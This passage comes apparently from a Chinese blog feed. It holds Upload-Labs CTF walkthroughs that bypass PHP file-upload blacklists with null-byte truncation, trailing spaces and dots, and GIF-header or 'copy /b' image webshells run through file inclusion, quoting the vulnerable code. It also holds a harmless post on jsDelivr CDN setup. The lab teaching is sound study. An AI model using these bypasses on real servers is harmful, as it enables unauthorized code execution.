&lt;p&gt;​ 使用bp抓包并添加&lt;code&gt;0x00截断&lt;/code&gt;，在GET请求中可以使用url编码的截断：&lt;code&gt;%00&lt;/code&gt;。贴个自己参考的博客，&lt;a class="link" href="https://www.cnblogs.com/milantgh/p/3612978.html" target="_blank" rel="noopener"
&gt;截断上传原理剖析&lt;/a&gt;。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了&lt;code&gt;$_GET['save_path']&lt;/code&gt;变量的值，但是我们在这个变量后面添加了&lt;code&gt;0x00截断&lt;/code&gt;，所以后面的代码便不会执行，文件也就不会被重命名。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115204109.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由&lt;code&gt;..../upload/233.php�/5120201115205501.jpg&lt;/code&gt;变为&lt;code&gt;..../upload/233.php&lt;/code&gt;。完工&lt;/p&gt;
&lt;h2 id="pass-12"&gt;Pass-12
&lt;/h2&gt;&lt;p&gt;​ （windows环境）&lt;/p&gt;
&lt;p&gt;​ 这题和上一题差不多一样，就是把&lt;code&gt;$_GET['save_path']&lt;/code&gt;变成了&lt;code&gt;$_POST['save_path']&lt;/code&gt;。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过&lt;strong&gt;16进制修改&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115210935.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 这里我命名为&lt;code&gt;233.phpa&lt;/code&gt;是因为方便我在Hex表中找到这句话的位置和修改数据。&lt;code&gt;a&lt;/code&gt;的16进制是&lt;code&gt;61&lt;/code&gt;，需要改成截断的值：&lt;code&gt;00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115211024.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工&lt;/p&gt;
&lt;h2 id="pass-13"&gt;Pass-13
&lt;/h2&gt;&lt;p&gt;​ （Linux环境）&lt;/p&gt;
&lt;p&gt;​ 源码中有关的函数解释：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://segmentfault.com/a/1190000008305573" target="_blank" rel="noopener"
&gt;PHP中pack、unpack的详细用法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.php.net/manual/zh/function.fread.php" target="_blank" rel="noopener"
&gt;fread()&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.php.net/fclose" target="_blank" rel="noopener"
&gt;fclose()&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.php.net/intval" target="_blank" rel="noopener"
&gt;intval()&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 这道题和前面题目都不一样了：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115211509.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 题目说道需要&lt;strong&gt;上传图片马&lt;/strong&gt;，然后使用&lt;strong&gt;文件包含漏洞&lt;/strong&gt;进行测试，那么我们就先制作图片马。&lt;/p&gt;
&lt;p&gt;​ 查看本题的提示&lt;code&gt;本pass检查图标内容开头2个字节！&lt;/code&gt;，意思就是只检测文件前面两个字节的标识，贴一个&lt;a class="link" href="https://blog.csdn.net/qq_37414405/article/details/84660148" target="_blank" rel="noopener"
&gt;各种格式图片文件头标识分析&lt;/a&gt;，所以这道题只用在上传的文件头部的两个字节处粘贴对应&lt;strong&gt;文件的头标识&lt;/strong&gt;即可绕过检测。&lt;/p&gt;
&lt;p&gt;​ 以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入&lt;code&gt;GIF89a&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;，后缀名无所谓了，因为题目只检测前两个字节即可上传。&lt;/p&gt;
&lt;p&gt;​ &lt;strong&gt;还有一种方法制作图片马&lt;/strong&gt;：使用windows的&lt;code&gt;copy /b&lt;/code&gt;指令，把两个文件进行&lt;del&gt;无缝&lt;/del&gt;拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：&lt;a class="link" href="https://blog.csdn.net/gaoshi66/article/details/83653143" target="_blank" rel="noopener"
&gt;windows窗口命令——(copy/b)文件无缝拼接隐藏&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;​ 别忘了题目中说道了需要&lt;strong&gt;三种后缀都上传成功才算过关！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​ &lt;strong&gt;上传以后需要使用文件包含进行判定是否执行&lt;/strong&gt;，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击&lt;strong&gt;2&lt;/strong&gt;的链接进入&lt;code&gt;include.php&lt;/code&gt;进行文件包含：网址输入&lt;code&gt;https://...../include.php?file=./upload/8220201116071327.gif&lt;/code&gt;，找到php成功执行的页面。这里还有一个小知识点我学到的就是：&lt;a class="link" href="https://www.cnblogs.com/xc90/articles/10257402.html" target="_blank" rel="noopener"
&gt;路径中的&amp;rsquo;.&amp;lsquo;和&amp;rsquo;..&amp;lsquo;还有&amp;rsquo;./&amp;lsquo;和&amp;rsquo;../&amp;lsquo;都是什么意思&lt;/a&gt;。完工&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116152417.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="pass-14"&gt;Pass-14
&lt;/h2&gt;&lt;p&gt;​ （Linux环境）&lt;/p&gt;
&lt;p&gt;​ 这题提示写道&lt;code&gt;本pass使用getimagesize()检查是否为图片文件！&lt;/code&gt;，和上一题不一样的地方就是使用了&lt;code&gt;getimagesize()&lt;/code&gt;函数，这个函数的官方文档&lt;a class="link" href="https://www.php.net/manual/zh/function.getimagesize.php" target="_blank" rel="noopener"
&gt;getimagesize()&lt;/a&gt;，所以这道题就不能用13题的加&lt;strong&gt;文件的头标识&lt;/strong&gt;方法绕过，这次要使用上一题中的&lt;code&gt;copy /b&lt;/code&gt;指令用一张正常的图片进行拼接还是可以通过的。&lt;/p&gt;
&lt;p&gt;​ PS：听同学说&lt;code&gt;getimagesize()&lt;/code&gt;不过是检测了前八个字节，不过我没试。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116155407.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 因为是拼接的，所以要直接摸到图片最底部查看成功。完工&lt;/p&gt;
&lt;h2 id="pass-15"&gt;Pass-15
&lt;/h2&gt;&lt;p&gt;​ （Linux环境）&lt;/p&gt;
&lt;p&gt;​ 13、14、15题都是对&lt;strong&gt;文件的头标识&lt;/strong&gt;进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用&lt;code&gt;copy /b&lt;/code&gt;制作的图片马可以直接通过。&lt;/p&gt;
&lt;p&gt;​ 网上搜集过来的资料&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;png 文件头 89504E470D0A1A0A&lt;/p&gt;
&lt;p&gt;jpg 文件头 89504E470D0A1A0A&lt;/p&gt;
&lt;p&gt;gif 文件头 474946383961&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工&lt;/p&gt;</description></item><item><title>jsDelivr加速静态博客</title><link>https://www.braindance.top/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</link><pubDate>Wed, 11 Nov 2020 21:37:53 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;​ 这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在犹豫要不要买的时候，发现了这个东西：&lt;a class="link" href="https://www.jsdelivr.com/" target="_blank" rel="noopener"
&gt;jsdelivr&lt;/a&gt;，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞&lt;/p&gt;
&lt;h2 id="1-新建仓库"&gt;1. 新建仓库
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed/artical/20201111202508.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 名字重了是因为我已经创建好了并且使用了以后才来写的博客。&lt;/p&gt;
&lt;h2 id="2-克隆git仓库到本地"&gt;2. 克隆Git仓库到本地
&lt;/h2&gt;&lt;p&gt;​ 在自己电脑建个文件夹然后打开git输入&lt;code&gt;git clone 你仓库的链接&lt;/code&gt;，把刚刚创建的仓库拉倒本地方便上传到仓库。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed/artical/20201111203733.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：&lt;a class="link" href="https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000" target="_blank" rel="noopener"
&gt;Git简介&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id="3-上传需要加速的资源"&gt;3. 上传需要加速的资源
&lt;/h2&gt;&lt;p&gt;​ 把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;git status //查看状态
git add . //添加所有文件到暂存区
git commit -m &amp;#39;第一次提交&amp;#39; //把文件提交到仓库
git push //推送至远程仓库
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。&lt;/p&gt;
&lt;p&gt;​ 接下来是要上传哪些文件，我使用的是&lt;code&gt;butterfly&lt;/code&gt;这个主题，&lt;a class="link" href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"
&gt;主题github&lt;/a&gt;支持一下作者，直接在主题&lt;code&gt;theme/butterfly&lt;/code&gt;文件夹下面找到资源文件夹&lt;code&gt;source&lt;/code&gt;发现里面都是一些零碎的文件，但是在发布文件夹&lt;code&gt;public&lt;/code&gt;下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed/artical/20201111205045.png"
loading="lazy"
&gt; 穷人流下了不争气的泪。传！(真加速还得选好服务器)&lt;/p&gt;
&lt;p&gt;​ 这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。&lt;/p&gt;
&lt;p&gt;​ 做法：配置文件里找到引用的是本地资源的项，然后在生成网站的&lt;code&gt;public&lt;/code&gt;文件下找到对应的资源文件。&lt;/p&gt;
&lt;p&gt;我列一下我在配置文件里修改的项：&lt;code&gt;main_css&lt;/code&gt;、&lt;code&gt;main&lt;/code&gt;、&lt;code&gt;utils&lt;/code&gt;、&lt;code&gt;local_search&lt;/code&gt;、&lt;code&gt;algolia_js&lt;/code&gt;、&lt;code&gt;translate&lt;/code&gt;，因为使用的是&lt;code&gt;Valine&lt;/code&gt;评论，里面可以设置自定义表情，我也使用这个方法修改了。&lt;/p&gt;
&lt;h2 id="3-获取地址"&gt;3. 获取地址
&lt;/h2&gt;&lt;p&gt;​ 官网首页很清楚的写明了如何获取资源链接&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201111211357.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ &lt;code&gt;https://cdn.jsdelivr.net/gh/user/repo@version/file&lt;/code&gt;，&lt;code&gt;user&lt;/code&gt;就是你的github用户名，&lt;code&gt;repo@version&lt;/code&gt;，仓库加上版本号，&lt;code&gt;file&lt;/code&gt;就是仓库下的路径。&lt;/p&gt;
&lt;p&gt;​ 这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接&lt;code&gt;reop@分支名&lt;/code&gt;，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。&lt;/p&gt;
&lt;p&gt;​ 贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/penginman/PicBed@master/top_img/83531406_p0.png&lt;/p&gt;
&lt;p&gt;​ 这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。&lt;/p&gt;
&lt;h2 id="4-引用链接"&gt;4. 引用链接
&lt;/h2&gt;&lt;p&gt;​ 配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了&lt;strong&gt;你现在引用的是之前的上传的静态资源&lt;/strong&gt;，别忘啦！别忘啦！别忘啦！&lt;/p&gt;
&lt;p&gt;​ 我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。&lt;/p&gt;
&lt;p&gt;​ 还有我整理的&lt;code&gt;Valine&lt;/code&gt;评论的自定义表情，大伙可以直接拿去用：&lt;a class="link" href="https://cdn.jsdelivr.net/gh/penginman/CDN@master/emoji/" target="_blank" rel="noopener"
&gt;图片地址&lt;/a&gt;，&lt;a class="link" href="https://cdn.jsdelivr.net/gh/penginman/CDN@master/emoji/valine.json" target="_blank" rel="noopener"
&gt;emojimap&lt;/a&gt;。完工&lt;/p&gt;</description></item><item><title>Upload-Labs(二)</title><link>https://www.braindance.top/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/upload-labs2/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;​ 这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
//这里下面是过滤
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
//这里下面是移动文件。
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;上传出错！&amp;#39;;
}
} else {
$msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;过滤部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$deny_ext&lt;/code&gt;是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_name = trim($FILES['upload_file']['name'])&lt;/code&gt;这段代码有两个点需要说：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$FILES['upload_file']['name']&lt;/code&gt;是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：&lt;a class="link" href="https://www.cnblogs.com/laijinquan/p/8682282.html" target="_blank" rel="noopener"
&gt;PHP $_FILES函数详解&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;trim()&lt;/code&gt;函数的作用就是去除文件名称前后的空格换行符等。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_name = deldot($file_name)&lt;/code&gt;这个注释中很清楚，是删除文章末尾的点。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_ext = strrchr($file_name, '.')&lt;/code&gt;中&lt;code&gt;strrchr(string s1,char c1)&lt;/code&gt;函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_ext = strtolower($file_ext)&lt;/code&gt;注释上转换小写。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_ext = str_ireplace('::$DATA', '', $file_ext)&lt;/code&gt;去除字符串::$DATA。第八题讲了原理&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上传部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;in_array($file_ext, $deny_ext)&lt;/code&gt;判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$_FILES['upload_file']['tmp_name']&lt;/code&gt;文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$img_path = UPLOAD_PATH.'/'.$file_name&lt;/code&gt;这个变量是设置需要保存到的路径&lt;/li&gt;
&lt;li&gt;&lt;code&gt;move_uploaded_file($temp_file, $img_path)&lt;/code&gt;本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="pass-06"&gt;Pass-06
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;);
$file_name = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;];
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#34;YmdHis&amp;#34;).rand(1000,9999).$file_ext;
if (move_uploaded_file($temp_file,$img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;上传出错！&amp;#39;;
}
} else {
$msg = &amp;#39;此文件不允许上传&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 看源码发现少了&lt;code&gt;trim()&lt;/code&gt;函数&lt;strong&gt;对文件名前后的空格处理&lt;/strong&gt;，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php (有空格)绕过黑名单数组。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/Bb9jQe.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 上传以后访问文件执行成功。完工&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/Bb9xLd.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 这里说明一下，我前面是在&lt;a class="link" href="https://buuoj.cn/" target="_blank" rel="noopener"
&gt;BUUCTF&lt;/a&gt;在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06&amp;ndash;&amp;gt;github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;h2 id="pass-07"&gt;Pass-07
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;上传出错！&amp;#39;;
}
} else {
$msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 这道题少了&lt;strong&gt;删除文件名末尾的点&lt;/strong&gt;，我们可以通过构造&lt;strong&gt;2333.php. .&lt;/strong&gt;(末尾加 点 空格 点)，被解析后文件后缀就会成为&amp;quot;. &amp;ldquo;(一个点一个空格)，可以绕过黑名单，访问的文件名是&lt;code&gt;2333.php. .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbCOkq.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个&amp;rdquo;.&amp;quot;，尝试在windows靶机上测试&lt;strong&gt;只添加一个点&lt;/strong&gt;，访问的文件名为&lt;code&gt;2333.php、2333.php.&lt;/code&gt;都可以，因为windows会删除最后一个点。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbMywV.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbKXq0.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工&lt;/p&gt;
&lt;h2 id="pass-08"&gt;Pass-08
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;